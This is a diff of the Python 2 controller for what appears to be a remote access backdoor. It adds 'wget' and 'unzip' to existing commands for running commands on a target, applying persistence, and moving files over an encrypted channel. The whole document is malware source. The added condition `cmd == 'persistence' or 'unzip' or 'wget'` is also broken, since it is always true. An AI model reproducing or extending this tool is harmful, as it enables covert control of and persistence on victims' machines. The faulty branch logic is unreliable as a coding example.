@@ -34,13 +34,15 @@ HELP_TEXT = '''
 download <files>    - Download file(s).
 help                - Show this help menu.
 persistence         - Apply persistence mechanism.
+quit                - Gracefully kill client and server.
 rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
+unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
-quit                - Gracefully kill client and server.
+wget <url>          - Download a file from the web.
 '''
-COMMANDS = [ 'download', 'help', 'persistence', 'rekey', 'run', 'upload',
-             'quit' ]
+COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
+             'unzip', 'upload', 'wget' ]
 
 
 def get_parser():
@@ -127,8 +129,8 @@ def main():
             DHKEY = crypto.diffiehellman(conn, server=True)
 
         # results of persistence
-        elif cmd == 'persistence':
-            print 'Applying persistence mechanism...'
+        elif cmd == 'persistence' or 'unzip' or 'wget':
+            print 'Running {}...'.format(cmd)
             recv_data = conn.recv(1024)
             print crypto.AES_decrypt(recv_data, DHKEY)
 
